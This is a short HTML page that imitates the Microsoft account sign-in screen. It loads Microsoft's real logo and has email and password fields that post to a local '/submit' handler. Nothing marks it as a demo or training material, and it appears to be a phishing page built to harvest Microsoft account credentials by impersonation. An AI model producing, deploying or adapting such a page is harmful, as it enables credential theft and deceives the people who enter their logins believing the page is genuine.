<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Sign in to your Microsoft account</title>
  <style>
    body { font-family: Arial; background: #f3f3f3; text-align: center; margin-top: 100px; }
    .login-box { background: white; padding: 30px; border-radius: 8px; width: 300px; margin: auto; box-shadow: 0 0 10px #aaa; }
    input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; }
    button { background: #0078D7; color: white; padding: 10px; width: 100%; border: none; border-radius: 5px; }
    img { width: 120px; margin-bottom: 20px; }
  </style>
</head>
<body>
  <div class="login-box">
    <img src="https://logincdn.msauth.net/shared/1.0/content/images/microsoft_logo.svg" alt="Microsoft">
    <form action="/submit" method="POST">
      <input type="email" name="email" placeholder="Email, phone, or Skype" required><br>
      <input type="password" name="password" placeholder="Password" required><br>
      <button type="submit">Sign In</button>
    </form>
  </div>
</body>
</html>
